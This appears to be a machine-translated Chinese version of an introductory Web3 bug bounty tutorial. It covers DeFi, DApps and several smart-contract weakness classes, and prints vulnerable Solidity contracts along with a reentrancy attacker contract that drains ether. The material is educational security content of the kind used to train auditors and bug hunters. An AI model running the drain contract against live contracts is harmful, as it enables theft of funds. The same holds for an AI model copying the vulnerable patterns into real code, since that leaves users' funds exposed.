<html>
<head>
<title>Hacking Web3: Introduction and How to Start</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客网站3:介绍和如何开始</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hacking-web3-introduction-and-how-to-start-88ae2c51f3ec?source=collection_archive---------0-----------------------#2022-05-19">https://infosecwriteups.com/hacking-web3-introduction-and-how-to-start-88ae2c51f3ec?source=collection_archive---------0-----------------------#2022-05-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/da86e6ba818754e4f2c0a1317fa32100.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oNoQZ8ecKjRTkBPENEBarg.png"/></div></div></figure><p id="06c6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Web3是一项新技术，我们希望它比web2安全得多。事实上，web3是我们旧的万维网的一个新版本，但是这一次是分散的并且基于区块链。Web3支持区块链、加密货币和NFTs。因为Web3是一项新技术，公司没有为新的风险和安全问题做好准备，赢家是能够预测和预防所有可能的安全问题的人。由于web3应用程序每天都有数百万美元的风险，今天，一些Web3公司已经注册了一个bug赏金计划，并向白帽黑客支付费用来保护他们的业务。</p><h1 id="d13d" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">概念:</h1><h2 id="2140" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">分散融资(DeFi):</h2><p id="d616" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">DeFi提供金融工具，不依赖中介机构，如经纪公司或银行。这些应用程序允许用户进行储蓄、借贷和交易，而不收取任何费用(银行等任何金融公司都会收取)。此外，这些应用程序非常快，任何人都可以使用它们，无需任何批准。这意味着任何地方的任何人都可以通过互联网接入这些金融服务。DeFi应用程序使用区块链，名为DApps的应用程序管理和处理事务。</p><h2 id="ae43" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">分散应用(DApp):</h2><p id="ac24" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">分散式应用程序是分散式网络上的应用程序，它提供前端用户界面，并结合了由以太坊开发和支持的智能契约。集中式应用程序使用单台计算机，但DApps在计算机的对等网络上运行，并使用区块链进行数据存储。在以太坊上，智能合约是开源透明的。</p><h2 id="3d2c" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">Web3 Bug赏金:</h2><p id="7696" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">Web3 bug bounty几乎是一个新的话题，没有太多的平台。但在2017年，一家名为<a class="ae ml" href="http://hacken.io" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> Hacken </strong> </a>的新网络安全咨询公司开始为区块链安全部门提供网络安全服务。<a class="ae ml" href="https://hackenproof.com/" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">Hacken proof</strong></a><strong class="ka ir"/>是哈肯集团的一部分。还有，<a class="ae ml" href="https://immunefi.com/" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">Immunefi</strong></a><strong class="ka ir"/>是一个不错的web3 bug赏金平台，成立于2020年。Immunefi为白人黑客提供了最大的奖金，例如，Immunefi中的单个程序(虫洞)为关键的智能合约漏洞提供了<strong class="ka ir">10，000，000美元</strong>。</p><h1 id="1193" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">基础:</h1><p id="9660" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">在所有学科中，你需要强大的基础才能成为专家。例如，在一场汽车比赛中，想象你有一辆好车。尽管如此，你不太了解这条路或你的车的可能性，在平行车道上，你的朋友有一辆普通的车，但他很清楚路线，也知道他可以做些什么来通过使用他的车的能力更快更容易地通过这条路。猜猜谁赢了？是的，你的朋友。这意味着一个专业的Solidity开发人员知道关键功能在哪里实现了，合同开发人员可能在哪里出错，但是一个不了解智能合同开发的黑客怎么会想黑一个智能合同呢？<br/>这就是为什么我强烈建议您学习更多关于区块链的原理、以太坊如何工作以及如何开发智能合同的知识。<br/>首先，你需要知道区块链是什么，它是如何工作的，<a class="ae ml" href="https://www.udemy.com/course/blockchain-theory-101/" rel="noopener ugc nofollow" target="_blank">区块链理论101 </a> Udemy课程和<a class="ae ml" href="https://www.amazon.com/Blockchain-Developer-Implementing-Distributed-Blockchain-based/dp/1484248465" rel="noopener ugc nofollow" target="_blank">Elad El rom的区块链开发者</a>是区块链基础知识的良好资源。因为所有的智能合约和以太坊账户都存在于以太坊虚拟机中，所以你应该知道这一点。Andreas Antonopoulos的《掌握以太坊》是一本关于以太坊如何运作的书。</p><p id="7458" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">编程是你应该学习的另一件重要的事情。众所周知，所有以太坊去中心化应用(DApps)都有一个智能契约(通常由Solidity编写)和一个前端用户界面。你使用的智能合约可能是你或其他人写的，因为之前提到过以太坊的每个智能合约都是开源的。</p><p id="9596" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">透明性和可访问性是DeFi的良好特性，在Web 2.0中，一个小型开发团队编写代码，其他人看不到程序代码，但在Web3中，应用程序是在所有人的眼皮底下开发的。</p><p id="c944" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">最流行的智能合同语言是可靠性。这种语言是一种面向对象的高级语言，用于实现智能合约。如果你已经知道一门编程语言，学习扎实对你来说是非常容易的，“<a class="ae ml" href="https://solidity-by-example.org/" rel="noopener ugc nofollow" target="_blank">扎实举例</a>”是学习扎实的更好资源。另一种编写智能合同的流行语言是JavaScript。这种流行的语言在客户端和服务器端都能工作。《JavaScript:权威指南》这本书是学习JavaScript的最佳途径。JavaScript最流行的web3库是<code class="fe mm mn mo mp b">web3.js</code>和<code class="fe mm mn mo mp b">ethers.js</code>。<br/>除了这两种语言，Viper和Rust也是智能合约的好语言。</p><h1 id="e07d" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">Web3中的漏洞:</h1><p id="89f2" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">Web3的bug不像web2的bug，有很多区别。<br/>你可以在web3应用中找到web2的bug，而不是在智能合约中。在web2中，我们使用CWE对漏洞进行分类，但是在智能合约中，我们使用<strong class="ka ir">智能合约弱点分类</strong> (SWC)对问题进行分类。你可以在<a class="ae ml" href="https://swcregistry.io/" rel="noopener ugc nofollow" target="_blank"> SWC注册中心</a>找到智能合约弱点的完整列表。</p><p id="52fb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在本文中，您将熟悉一些最流行的web3漏洞。</p><h2 id="e7de" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">功能默认可见性(SWC-100)</h2><p id="b180" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">当开发人员忘记为函数设置适当的可见性，并且恶意用户(黑客)可以进行未经授权或意外的状态更改时，就会出现此问题。</p><pre class="mq mr ms mt gt mu mp mv mw aw mx bi"><span id="2c87" class="lu kx iq mp b gy my mz l na nb">pragma solidity ^0.4.24;<br/><strong class="mp ir">contract</strong> <strong class="mp ir">FunctionDefaultVisibility</strong> {<br/>   <strong class="mp ir">function</strong> <strong class="mp ir">withdrawWinnings</strong>() {<br/>     <strong class="mp ir">require</strong>(<strong class="mp ir">uint32</strong>(msg.sender) == 0);<br/>     _sendWinnings();<br/>   }<br/>   <strong class="mp ir">function</strong> <strong class="mp ir">_sendWinnings</strong>() {<br/>     msg.sender.transfer(this.balance);<br/>   }<br/>}</span></pre><p id="9746" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如您所见，没有设置任何函数可见性(私有、公共、内部……)。</p><h2 id="4ba8" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">无保护以太坊提款(SWC-105)</h2><p id="dda9" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">由于访问控制缺失或不足，恶意方可以从合同中撤销所有醚。这个问题有时是由无意中公开init函数引起的。由于错误地将一个函数命名为构造函数，构造函数代码以运行时字节代码结束，任何人都可以调用它来重新初始化协定。</p><h2 id="988b" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">重返(SWC-107)</h2><p id="d8fc" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">在可重入攻击中，恶意契约(攻击者契约)在函数的第一次调用完成之前回调调用契约。这可能导致函数的不同调用以不期望的方式交互。</p><p id="520c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">易受攻击合同的示例:</strong></p><pre class="mq mr ms mt gt mu mp mv mw aw mx bi"><span id="756b" class="lu kx iq mp b gy my mz l na nb">contract DepositFunds {<br/>    mapping(address =&gt; uint) public balances;<br/><br/>    function deposit() public payable {<br/>        balances[msg.sender] += msg.value;<br/>    }<br/><br/>    function withdraw() public {<br/>        uint bal = balances[msg.sender];<br/>        require(bal &gt; 0);<br/><br/>        (bool sent, ) = msg.sender.call{value: bal}("");<br/>        require(sent, "Failed to send Ether");<br/><br/>        balances[msg.sender] = 0;<br/>    }<br/><br/><br/>}</span></pre><p id="32dd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当用户请求大量乙醚时，该漏洞就会出现。在这种情况下，攻击者调用<code class="fe mm mn mo mp b">withdraw()</code>函数。他可以转移代币，即使他已经收到代币，因为他的余额还没有设置为0。</p><p id="b60c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">攻击者可以创建以下合同并利用可重入性漏洞:</p><pre class="mq mr ms mt gt mu mp mv mw aw mx bi"><span id="f29f" class="lu kx iq mp b gy my mz l na nb">contract Attack {<br/>    DepositFunds public depositFunds;<br/><br/>    constructor(address _depositFundsAddress) {<br/>        depositFunds = DepositFunds(_depositFundsAddress);<br/>    }<br/><br/>    // Fallback is called when DepositFunds sends Ether to this contract.<br/>    fallback() external payable {<br/>        if (address(depositFunds).balance &gt;= 1 ether) {<br/>            depositFunds.withdraw();<br/>        }<br/>    }<br/><br/>    function attack() external payable {<br/>        require(msg.value &gt;= 1 ether);<br/>        depositFunds.deposit{value: 1 ether}();<br/>        depositFunds.withdraw();<br/>    }<br/><br/><br/>}</span></pre><p id="005f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">阅读更多关于<a class="ae ml" href="https://hackernoon.com/hack-solidity-reentrancy-attack" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">的重入攻击</strong> </a> <strong class="ka ir">。</strong></p><h2 id="230d" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">可塑性签名(SWC-117)</h2><p id="b9b4" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">通常，人们假设在以太坊合同中使用加密签名系统来验证签名是唯一的，但是以太坊中的签名可以在不拥有私钥的情况下被更改，并且仍然有效。例如，椭圆密钥加密包含三个变量:<em class="nc"> v </em>、<em class="nc"> r </em>和<em class="nc"> s </em>，如果这些值以正确的方式修改，您可以用无效的私钥获得有效的签名。</p><h2 id="26f1" class="lu kx iq bd ky lv lw dn lc lx ly dp lg kj lz ma lk kn mb mc lo kr md me ls mf bi translated">写入任意位置(SWC-124)</h2><p id="b8a0" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">智能合约的数据永久存储在EVM级别的某个存储位置。合同负责确保只有授权用户或合同帐户可以写入敏感存储位置。</p><p id="5be3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果攻击者可以写入任意存储位置，授权检查很容易被绕过。它允许攻击者覆盖包含所有者地址的字段。</p><pre class="mq mr ms mt gt mu mp mv mw aw mx bi"><span id="a4ee" class="lu kx iq mp b gy my mz l na nb">pragma solidity ^0.4.25;<br/>contract Wallet {<br/>  uint[] private bonusCodes;<br/>  address private owner;</span><span id="36ff" class="lu kx iq mp b gy nd mz l na nb">  constructor() public {<br/>        bonusCodes = new uint[](0);<br/>        owner = msg.sender;<br/>  }</span><span id="3f09" class="lu kx iq mp b gy nd mz l na nb">  function () public payable {<br/>  }</span><span id="2e62" class="lu kx iq mp b gy nd mz l na nb">  function PushBonusCode(uint c) public {<br/>        bonusCodes.push(c);<br/>  }</span><span id="ff07" class="lu kx iq mp b gy nd mz l na nb">  function PopBonusCode() public {<br/>        require(0 &lt;= bonusCodes.length);<br/>        bonusCodes.length--;<br/>  }</span><span id="7b85" class="lu kx iq mp b gy nd mz l na nb">  function UpdateBonusCodeAt(uint idx, uint c) public {<br/>        require(idx &lt; bonusCodes.length);<br/>        bonusCodes[idx] = c;<br/>  }</span><span id="71ce" class="lu kx iq mp b gy nd mz l na nb">  function Destroy() public {<br/>        require(msg.sender == owner);<br/>        selfdestruct(msg.sender);<br/>  }<br/>}</span></pre><p id="5faf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如你所看到的，在<strong class="ka ir">第4行</strong>中,<code class="fe mm mn mo mp b">bonusCodes</code>变量声明在<strong class="ka ir">第26行</strong>中我们可以在这个位置写入。</p><h1 id="d5af" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">然后</h1><p id="00ab" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">既然你已经对DeFi、DApp和Web3有了足够的了解，我建议你学习更多关于智能合约的弱点，这会很有帮助。如果你想让一个以太坊虚拟机在上面测试智能合约bug，CTFs可以帮上忙。您可以练习所学的课程，并对Web3黑客技术更加熟悉。<a class="ae ml" href="https://ethernaut.openzeppelin.com" rel="noopener ugc nofollow" target="_blank">以太游戏</a>、<a class="ae ml" href="https://capturetheether.com" rel="noopener ugc nofollow" target="_blank">夺取以太</a>、<a class="ae ml" href="https://damnvulnerabledefi.xyz" rel="noopener ugc nofollow" target="_blank"> VulnerableDefi </a>是练习智能合约漏洞最好的CTF。</p><p id="ad93" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这些CTF的解决方案可以在<a class="ae ml" href="https://hackernoon.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> Hackernoon </strong> </a>上找到，你可以在那里用<em class="nc"> solidity-hack </em>标签找到它们。</p><p id="dd25" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">此外，工具可以帮助你在狩猎过程中，自动化，你可以找到越来越多的错误。最好的web3黑客工具有<a class="ae ml" href="https://github.com/ConsenSys/mythril" rel="noopener ugc nofollow" target="_blank"> Mythril </a>、<a class="ae ml" href="https://github.com/ConsenSys/surya" rel="noopener ugc nofollow" target="_blank"> Surya </a>、<a class="ae ml" href="https://github.com/dapphub/dapptools/tree/master/src/seth" rel="noopener ugc nofollow" target="_blank"> Seth </a>和<a class="ae ml" href="https://github.com/dapphub/dapptools" rel="noopener ugc nofollow" target="_blank">daptools</a>。</p><p id="33c7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">经过大量的实践和学习，你成为一个熟练的web3黑客，然后你可以去web3 bug bounty平台，选择一个程序，开始黑客。当然，你在学习的时候可以把这个当做练习，但是当你是专家的时候去现有的平台挣钱也不错。</p><h1 id="69c5" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">结论:</h1><p id="820b" class="pw-post-body-paragraph jy jz iq ka b kb mg kd ke kf mh kh ki kj mi kl km kn mj kp kq kr mk kt ku kv ij bi translated">没有技术是完美的，安全也从来不是100%。要破解东西，你只需要开始学习，练习，练习，再练习。</p></div></div>    
</body>
</html>